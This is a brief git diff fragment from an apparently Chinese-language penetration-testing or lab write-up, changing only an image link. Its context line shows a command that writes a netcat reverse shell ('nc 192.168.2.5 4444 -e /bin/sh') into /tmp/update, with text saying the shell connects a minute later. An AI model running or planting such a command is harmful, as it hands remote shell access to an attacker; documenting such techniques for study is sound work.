@@ -219,4 +219,4 @@ echo '/usr/bin/nc 192.168.2.5 4444 -e /bin/sh' > /tmp/update
 
 一分钟后就可以连接反弹shell
 
-![image-20220908222558029](../../.gitbook/assets/image-20220908222558029.png)
+![image-20230208160708748](../../.gitbook/assets/image-20230208160708748.png)
